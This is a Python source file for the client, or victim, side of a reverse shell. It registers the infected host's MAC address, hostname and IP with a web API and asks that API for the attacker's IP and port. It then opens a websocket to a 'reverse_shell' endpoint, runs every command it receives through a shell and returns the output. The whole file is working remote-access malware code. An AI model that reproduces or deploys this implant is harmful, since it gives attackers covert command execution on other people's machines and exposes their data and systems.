import os
import re
import json
import uuid
import socket
import subprocess
from api import Client as Api
import websockets
import asyncio


class Client(object):

    def __init__(self):
        self.host_name = socket.gethostname()
        self.host_ip = socket.gethostbyname(self.host_name)
        self.port = ''
        self.mac_address = self.get_mac_address()
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.api = Api()
        # Change directory to 'Desktop'.
        # os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop")) #TODO Fix this.

    @staticmethod
    def get_mac_address():
        # joins elements of getnode() after each 2 digits.
        # using regex expression
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))

    def connect_to_attacker(self):
        response = self.api.get_attacker(self.mac_address)
        while response.status_code != 200:
            response = self.api.get_attacker(self.mac_address)
        attacker = json.loads(response.text)
        attacker_ip = attacker['ip']
        attacker_port = attacker['port']
        self.connect_socket(attacker_ip, attacker_port)
        self.api.update_victim(self.mac_address, data={'port': self.client.getsockname()[1]})

    def connect_to_web_server(self):
        username = self.mac_address.replace(':', '')
        response = self.api.login(username, self.mac_address)
        if response.status_code == 401:
            self.api.register(username, self.mac_address)
        response = self.api.create_victim(self.host_ip, self.port, self.host_name, self.mac_address, username)
        if response.status_code == 400:
            self.api.update_victim(self.mac_address, data={'logged_in': True})
        # self.connect_to_attacker()

    def connect_socket(self, ip, port):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((ip, port))

    async def execute_command(self, command):
        if command == 'quit':
            print("quitting...")
            self.client.close()
        if command[:2] == 'cd':
            os.chdir(command[3:])
        if len(command) > 0:
            command = subprocess.Popen(
                command[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
            output_bytes = command.stdout.read()
            output_str = f'{os.getcwd()}${str(output_bytes, "utf-8")}'
        return output_str

    async def hello(self):
        uri = "ws://localhost:8000/ws/reverse_shell/connect/lobby/"
        async with websockets.connect(uri) as websocket:
            while True:
                data = await websocket.recv()
                command = json.loads(data)['message']
                output = await self.execute_command(command)
                await websocket.send(json.dumps({'message': output}))


if __name__ == '__main__':
    client = Client()
    client.connect_to_web_server()
    asyncio.get_event_loop().run_until_complete(client.hello())
